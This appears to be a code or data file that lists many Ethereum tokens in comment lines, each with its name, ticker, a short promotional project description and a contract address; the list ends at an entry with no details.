// Pioneering #PriFi with the world’s Private Derivatives Platform. 1:1 Collateralization, Zero slippage, Zero liquidations. #zkAssets are here.
// 0xabe580e7ee158da464b51ee1a83ac0289622e6be

// Quantum (QAU)
// Quantum aims to be a deflationary currency.
// 0x671abbe5ce652491985342e85428eb1b07bc6c64

// DAPSTOKEN (DAPS)
// The DAPS project plans to create the world's first fully private blockchain that also maintains the 'Trustless' structure of traditional public blockchains.
// 0x93190dbce9b9bd4aa546270a8d1d65905b5fdd28

// GOVI (GOVI)
// CVI is created by computing a decentralized volatility index from cryptocurrency option prices together with analyzing the market’s expectation of future volatility.
// 0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107

// Fractal Protocol Token (FCL)
// The Fractal Protocol is an open-source protocol designed to rebalance the incentives that make a free and open Web work for all. It builds a new equilibrium that respects user privacy, rewards content creators, and protects advertisers from fraud.
// 0xf4d861575ecc9493420a3f5a14f85b13f0b50eb3

// BHPCash (BHPC)
// Distributed bank based on bitcoin hash power credit, offers innovative service of receiving dividend from mining and multiple derivative financial services on the basis of mining hash power.
// 0xee74110fb5a1007b06282e0de5d73a61bf41d9cd

// Nerve Network (NVT)
// NerveNetwork is a decentralized digital asset service network based on the NULS micro-services framework.
// 0x7b6f71c8b123b38aa8099e0098bec7fbc35b8a13

// Spice (SFI)
// Saffron is an asset collateralization platform where liquidity providers have access to dynamic exposure by selecting customized risk and return profiles.
// 0xb753428af26e81097e7fd17f40c88aaa3e04902c

// GHOST (GHOST)
// GHOST is a Proof of Stake privacy coin to help make you nothing but a 'ghost' when transacting online!
// 0x4c327471C44B2dacD6E90525f9D629bd2e4f662C

// Torum (XTM)
// Torum is a SocialFi ecosystem (Social, NFT,DeFi, Metaverse) that is specially designed to connect cryptocurrency users.
// 0xcd1faff6e578fa5cac469d2418c95671ba1a62fe

// PolkaBridge (PBR)
// PolkaBridge offers a decentralized bridge that connects Polkadot platform and other blockchains.
// 0x298d492e8c1d909d3f63bc4a36c66c64acb3d695

// AurusDeFi (AWX)
// AurusDeFi (AWX) is a revenue-sharing token limited to a total supply of 30 million tokens. AWX entitles its holders to receive 50% of the revenues generated from AurusGOLD (AWG), and 30% from both AurusSILVER (AWS) and AurusPLATINUM (AWP), paid out in AWG, AWS, and AWP.
// 0xa51fc71422a30fa7ffa605b360c3b283501b5bf6

// Darwinia Network Native Token (RING)
// Darwinia Network provides game developers the scalability, cross-chain interoperability, and NFT identifiability, with seamless integrations to Polkadot, bridges to all major blockchains, and on-chain RNG services
// 0x9469d013805bffb7d3debe5e7839237e535ec483

// MCDEX Token (MCB)
// Monte Carlo Decentralized Exchange is a crypto trading platform. MCDEX is powered by the Mai Protocol smart contracts deployed on the Ethereum blockchain. The Mai Protocol smart contracts are fully audited by Open Zeppelin, Consensys, and Chain Security.
// 0x4e352cF164E64ADCBad318C3a1e222E9EBa4Ce42

// SPANK (SPANK)
// A cryptoeconomic powered adult entertainment ecosystem built on the Ethereum network.
// 0x42d6622dece394b54999fbd73d108123806f6a18

// Nebulas (NAS)
// Decentralized Search Framework
// 0x5d65D971895Edc438f465c17DB6992698a52318D

// LAtoken (LA)
// LATOKEN aims to transform access to capital, and enables cryptocurrencies to be widely used in the real economy by making real assets tradable in crypto.
// 0xe50365f5d679cb98a1dd62d6f6e58e59321bcddf

// Tokenomy (TEN)
// Blockchain Project Launchpad & Token Exchange
// 0xdd16ec0f66e54d453e6756713e533355989040e4

// EVAI.IO (EVAI)
// Evai is a decentralised autonomous organisation (DAO) presenting a world-class decentralised ratings platform for crypto, DeFi and NFT-based assets that can be used by anyone to evaluate these new asset classes.
// 0x50f09629d0afdf40398a3f317cc676ca9132055c

// Jarvis Reward Token (JRT)
// Jarvis is a non-custodial financial ecosystem which allows you to manage your assets, from payment to savings, trade any financial markets with any collateral and access any Dapps.
// 0x8a9c67fee641579deba04928c4bc45f66e26343a

// Dentacoin (Dentacoin)
// Aims to be the blockchain solution for the global dental industry.
// 0x08d32b0da63e2C3bcF8019c9c5d849d7a9d791e6

// MetaGraphChain (BKBT)
// Value Discovery Platform of Block Chain & Digital Currencies Based On Meta-graph Chain
// 0x6a27348483d59150ae76ef4c0f3622a78b0ca698

// QuadrantProtocol (eQUAD)
// Quadrant is a blockchain-based protocol that enables the access, creation, and distribution of data products and services with authenticity and provenance at its core.
// 0xc28e931814725bbeb9e670676fabbcb694fe7df2

// BABB BAX (BAX)
// Babb is a financial blockchain platform based in London that aims to bring accessible financial services for the unbanked and under-banked globally.
// 0xf920e4F3FBEF5B3aD0A25017514B769bDc4Ac135

// All Sports Coin (SOC)
// All Sports public blockchain hopes to fill in the blank of blockchain application in sports industry through blockchain technology.
// 0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3

// Deri (DERI)
// Deri is a decentralized protocol for users to exchange risk exposures precisely and capital-efficiently. It is the DeFi way to trade derivatives: to hedge, to speculate, to arbitrage, all on chain.
// 0xa487bf43cf3b10dffc97a9a744cbb7036965d3b9

// BIXToken (BIX)
// A digital asset exchange platform. It aims to stabilize transactions and simplify operations by introducing AI technology to digital asset exchange.
// 0x009c43b42aefac590c719e971020575974122803

// BiFi (BiFi)
// BiFi is a multichain DeFi project powered by Bifrost. BiFi will offer multichain wallet, lending, borrowing, staking services, and other financial investments products.
// 0x2791bfd60d232150bff86b39b7146c0eaaa2ba81

// Covesting (COV)
// Covesting is a fully licensed distributed ledger technology (DLT) services provider incorporated under the laws of Gibraltar. We develop innovative trading tools to service both retail and institutional customers in the cryptocurrency space.
// 0xADA86b1b313D1D5267E3FC0bB303f0A2b66D0Ea7

// VALID (VLD)
// Authenticate online using your self-sovereign eID and start monetizing your anonymized personal data.
// 0x922ac473a3cc241fd3a0049ed14536452d58d73c

// iQeon (IQN)
// decentralized PvP gaming platform integrating games, applications and services based on intelligent competitions between users created to help players monetize their in-gaming achievements.
// 0x0db8d8b76bc361bacbb72e2c491e06085a97ab31

// Mallcoin Token (MLC)
// An international e-commerce site created for users from all over the world, who sell and buy various products and services with tokens.
// 0xc72ed4445b3fe9f0863106e344e241530d338906

// Knoxstertoken (FKX)
// FortKnoxster is a cybersecurity company specializing in safeguarding digital assets. Our innovations, security, and service are extraordinary, and we help secure and futureproof the FinTech and Blockchain space.
// 0x16484d73Ac08d2355F466d448D2b79D2039F6EBB

// DappRadar (RADAR)
// DappRadar aims to be one of the leading global NFT & DeFi DAPP store.
// 0x44709a920fccf795fbc57baa433cc3dd53c44dbe

// KleeKai (KLEE)
// KleeKai was launched as a meme coin, however now sports an addictive game 'KleeRun' a P2E game that is enjoyable for all ages. This token was a fair launch and rewards all holders with a 2% reflection feature that redistributes tokens among the holders every Buy, Swap & Sell.
// 0xA67E9F021B9d208F7e3365B2A155E3C55B27de71

// Six Domain Asset (SDA)
// SixDomainChain (SDChain) is a decentralized public blockchain ecosystem that integrates international standards of IoT Six-Domain Model and reference architecture standards for distributed blockchain.
// 0x4212fea9fec90236ecc51e41e2096b16ceb84555

// TOKPIE (TKP)
// Tokpie is the First Cryptocurrency Exchange with BOUNTY STAKES TRADING. TKP holders can get 500% discount on fees, 70% referral bonus, access to the bounty stakes depositing, regular airdrops and altcoins of promising projects, P2P loans with 90% LTV and income from TKP token staking (lending).
// 0xd31695a1d35e489252ce57b129fd4b1b05e6acac

// Partner (PRC)
// Pipelines valve production.
// 0xcaa05e82bdcba9e25cd1a3bf1afb790c1758943d

// Blockchain Monster Coin (BCMC)
// Blockchain Monster Hunt (BCMH) is the world’s first multi-chain game that runs entirely on the blockchain itself. Inspired by Pokémon-GO, BCMH allows players to continuously explore brand-new places on the blockchain to hunt and battle monsters.
// 0x2BA8349123de45E931a8C8264c332E6e9CF593F9

// Free Coin (FREE)
// Social project to promote cryptocurrency usage and increase global wealth
// 0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd

// LikeCoin (LIKE)
// LikeCoin aims to reinvent the Like by realigning creativity and reward. We enable attribution and cross-application collaboration on creative contents
// 0x02f61fd266da6e8b102d4121f5ce7b992640cf98

// IOI Token (IOI)
// QORPO aims to develop a complete ecosystem that cooperates together well, and one thing that ties it all together is IOI Token.
// 0x8b3870df408ff4d7c3a26df852d41034eda11d81

// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3


// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723


// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134

// PoolTogether (POOL)
// PoolTogether is a protocol for no-loss prize games.
// 0x0cec1a9154ff802e7934fc916ed7ca50bde6844e


// UNCL (UNCL)
// UNCL is the liquidity and yield farmable token of the Unicrypt ecosystem.
// 0x2f4eb47A1b1F4488C71fc10e39a4aa56AF33Dd49


// Medical Token Currency (MTC)
// MTC is an utility token that fuels a healthcare platform providing healthcare information to interested parties on a secure blockchain supported environment.
// 0x905e337c6c8645263d3521205aa37bf4d034e745


// TenXPay (PAY)
// TenX connects your blockchain assets for everyday use. TenX’s debit card and banking licence will allow us to be a hub for the blockchain ecosystem to connect for real-world use cases.
// 0xB97048628DB6B661D4C2aA833e95Dbe1A905B280


// Tierion Network Token (TNT)
// Tierion creates software to reduce the cost and complexity of trust. Anchoring data to the blockchain and generating a timestamp proof.
// 0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8


// DOVU (DOV)
// DOVU, partially owned by Jaguar Land Rover, is a tokenized data economy for DeFi carbon offsetting.
// 0xac3211a5025414af2866ff09c23fc18bc97e79b1


// RipioCreditNetwork (RCN)
// Ripio Credit Network is a global credit network based on cosigned smart contracts and blockchain technology that connects lenders and borrowers located anywhere in the world and on any currency
// 0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6


// UseChain Token (USE)
// Mirror Identity Protocol and integrated with multi-level innovations in technology and structure design.
// 0xd9485499499d66b175cf5ed54c0a19f1a6bcb61a


// TaTaTu (TTU)
// Social Entertainment Platform with an integrated rewards programme.
// 0x9cda8a60dd5afa156c95bd974428d91a0812e054


// GoBlank Token (BLANK)
// BlockWallet is a privacy-focused non-custodial crypto wallet. Besides full privacy functionality, BlockWallet comes packed with an array of features that go beyond privacy for a seamless user experience. Reclaim your financial privacy. Get BlockWallet.
// 0x41a3dba3d677e573636ba691a70ff2d606c29666

// Rapids (RPD)
// Fast and secure payments across social media via blockchain technology
// 0x4bf4f2ea258bf5cb69e9dc0ddb4a7a46a7c10c53


// VeriSafe (VSF)
// VeriSafe aims to be the catalyst for projects, exchanges and communities to collaborate, creating an ecosystem where transparency, accountability, communication, and expertise go hand-in-hand to set a standard in the industry.
// 0xac9ce326e95f51b5005e9fe1dd8085a01f18450c


// TOP Network (TOP)
// TOP Network is a decentralized open communication network that provides cloud communication services on the blockchain.
// 0xdcd85914b8ae28c1e62f1c488e1d968d5aaffe2b
	

// Virtue Player Points (VPP)
// Virtue Poker is a decentralized platform that uses the Ethereum blockchain and P2P networking to provide safe and secure online poker. Virtue Poker also launched Virtue Gaming: a free-to-play play-to-earn platform that is combined with Virtue Poker creating the first legal global player pool.
// 0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e
	

// Edgeless (EDG)
// The Ethereum smart contract-based that offers a 0% house edge and solves the transparency question once and for all.
// 0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c


// Blockchain Certified Data Token (BCDT)
// The Blockchain Certified Data Token is the fuel of the EvidenZ ecosystem, a blockchain-powered certification technology.
// 0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5


// Airbloc (ABL)
// AIRBLOC is a decentralized personal data protocol where individuals would be able to monetize their data, and advertisers would be able to buy these data to conduct targeted marketing campaigns for higher ROIs.
// 0xf8b358b3397a8ea5464f8cc753645d42e14b79ea

// DAEX Token (DAX)
// DAEX is an open and decentralized clearing and settlement ecosystem for all cryptocurrency exchanges.
// 0x0b4bdc478791897274652dc15ef5c135cae61e60

// Armor (ARMOR)
// Armor is a smart insurance aggregator for DeFi, built on trustless and decentralized financial infrastructure.
// 0x1337def16f9b486faed0293eb623dc8395dfe46a
	

// Spendcoin (SPND)
// Spendcoin powers the Spend.com ecosystem. The Spend Wallet App & Spend Card give our users a multi-currency digital wallet that they can manage or spend from
// 0xddd460bbd9f79847ea08681563e8a9696867210c
	

// Float Protocol: FLOAT (FLOAT)
// FLOAT is a token that is designed to act as a floating stable currency in the protocol.
// 0xb05097849bca421a3f51b249ba6cca4af4b97cb9


// Public Mint (MINT)
// Public Mint offers a fiat-native blockchain platform open for anyone to build fiat-native applications and accept credit cards, ACH, stablecoins, wire transfers and more.
// 0x0cdf9acd87e940837ff21bb40c9fd55f68bba059


// Internxt (INXT)
// Internxt is working on building a private Internet. Internxt Drive is a decentralized cloud storage service available for individuals and businesses.
// 0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4


// Vader (VADER)
// Swap, LP, borrow, lend, mint interest-bearing synths, and more, in a fairly distributed, governance-minimal protocol built to last.
// 0x2602278ee1882889b946eb11dc0e810075650983


// Launchpool token (LPOOL)
// Launchpool believes investment funds and communities work side by side on projects, on the same terms, towards the same goals. Launchpool aims to harness their strengths and aligns their incentives, the sum is greater than its constituent parts.
// 0x6149c26cd2f7b5ccdb32029af817123f6e37df5b


// Unido (UDO)
// Unido is a technology ecosystem that addresses the governance, security and accessibility challenges of decentralized applications - enabling enterprises to manage crypto assets and capitalize on DeFi.
// 0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06


// YOU Chain (YOU)
// YOUChain will create a public infrastructure chain that all people can participate, produce personal virtual items and trade personal virtual items on their own.
// 0x34364BEe11607b1963d66BCA665FDE93fCA666a8


// RUFF (RUFF)
// Decentralized open source blockchain architecture for high efficiency Internet of Things application development
// 0xf278c1ca969095ffddded020290cf8b5c424ace2



// OddzToken (ODDZ)
// Oddz Protocol is an On-Chain Option trading platform that expedites the execution of options contracts, conditional trades, and futures. It allows the creation, maintenance, execution, and settlement of trustless options, conditional tokens, and futures in a fast, secure, and flexible manner.
// 0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6


// DIGITAL FITNESS (DEFIT)
// Digital Fitness is a groundbreaking decentralised fitness platform powered by its native token DEFIT connecting people with Health and Fitness professionals worldwide. Pioneer in gamification of the Fitness industry with loyalty rewards and challenges for competing and staying fit and healthy.
// 0x84cffa78b2fbbeec8c37391d2b12a04d2030845e


// UCOT (UCT)
// Ubique Chain Of Things (UCT) is utility token and operates on its own platform which combines IOT and blockchain technologies in supply chain industries.
// 0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518

// VIN (VIN)
// Complete vehicle data all in one marketplace - making automotive more secure, transparent and accessible by all
// 0xf3e014fe81267870624132ef3a646b8e83853a96

// Aurora (AOA)
// Aurora Chain offers intelligent application isolation and enables multi-chain parallel expansion to create an extremely high TPS with security maintain.
// 0x9ab165d795019b6d8b3e971dda91071421305e5a


// Egretia (EGT)
// HTML5 Blockchain Engine and Platform
// 0x8e1b448ec7adfc7fa35fc2e885678bd323176e34


// Standard (STND)
// Standard Protocol is a Collateralized Rebasable Stablecoins (CRS) protocol for synthetic assets that will operate in the Polkadot ecosystem
// 0x9040e237c3bf18347bb00957dc22167d0f2b999d


// TrueFlip (TFL)
// Blockchain games with instant payouts and open source code,
// 0xa7f976c360ebbed4465c2855684d1aae5271efa9


// Strips Token (STRP)
// Strips makes it easy for traders and investors to trade interest rates using a derivatives instrument called a perpetual interest rate swap (perpetual IRS). Strips is a decentralised interest rate derivatives exchange built on the Ethereum layer 2 Arbitrum.
// 0x97872eafd79940c7b24f7bcc1eadb1457347adc9


// Decentr (DEC)
// Decentr is a publicly accessible, open-source blockchain protocol that targets the consumer crypto loans market, securing user data, and returning data value to the user.
// 0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3


// Jigstack (STAK)
// Jigstack is an Ethereum-based DAO with a conglomerate structure. Its purpose is to govern a range of high-quality DeFi products. Additionally, the infrastructure encompasses a single revenue and governance feed, orchestrated via the native $STAK token.
// 0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13


// CoinUs (CNUS)
// CoinUs is a integrated business platform with focus on individual's value and experience to provide Human-to-Blockchain Interface.
// 0x722f2f3eac7e9597c73a593f7cf3de33fbfc3308


// qiibeeToken (QBX)
// The global standard for loyalty on the blockchain. With qiibee, businesses around the world can run their loyalty programs on the blockchain.
// 0x2467aa6b5a2351416fd4c3def8462d841feeecec


// Digix Gold Token (DGX)
// Gold Backed Tokens
// 0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf


// aXpire (AXPR)
// The aXpire project is comprised of a number of business-to-business (B2B) software platforms as well as business-to-consumer (B2C) applications. As its mission, aXpire is focused on software for businesses that helps them automate outdated tasks, increasing efficiency, and profitability.
// 0xdD0020B1D5Ba47A54E2EB16800D73Beb6546f91A


// SpaceChain (SPC)
// SpaceChain is a community-based space platform that combines space and blockchain technologies to build the world’s first open-source blockchain-based satellite network.
// 0x8069080a922834460c3a092fb2c1510224dc066b


// COS (COS)
// One-stop shop for all things crypto: an exchange, an e-wallet which supports a broad variety of tokens, a platform for ICO launches and promotional trading campaigns, a fiat gateway, a market cap widget, and more
// 0x7d3cb11f8c13730c24d01826d8f2005f0e1b348f


// Arcona Distribution Contract (ARCONA)
// Arcona - X Reality Metaverse aims to bring together the virtual and real worlds. The Arcona X Reality environment generate new forms of reality by bringing digital objects into the physical world and bringing physical world objects into the digital world
// 0x0f71b8de197a1c84d31de0f1fa7926c365f052b3



// Posscoin (POSS)
// Posscoin is an innovative payment network and a new kind of money.
// 0x6b193e107a773967bd821bcf8218f3548cfa2503



// Internet Node Token (INT)
// IOT applications
// 0x0b76544f6c413a555f309bf76260d1e02377c02a

// PayPie (PPP)
// PayPie platform brings ultimate trust and transparency to the financial markets by introducing the world’s first risk score algorithm based on business accounting.
// 0xc42209aCcC14029c1012fB5680D95fBd6036E2a0


// Impermax (IMX)
// Impermax is a DeFi ecosystem that enables liquidity providers to leverage their LP tokens.
// 0x7b35ce522cb72e4077baeb96cb923a5529764a00


// 1-UP (1-UP)
// 1up is an NFT powered, 2D gaming platform that aims to decentralize battle-royale style tournaments for the average gamer, allowing them to earn.
// 0xc86817249634ac209bc73fca1712bbd75e37407d


// Centra (CTR)
// Centra PrePaid Cryptocurrency Card
// 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a


// NFT INDEX (NFTI)
// The NFT Index is a digital asset index designed to track tokens’ performance within the NFT industry. The index is weighted based on the value of each token’s circulating supply.
// 0xe5feeac09d36b18b3fa757e5cf3f8da6b8e27f4c

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104
}

// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
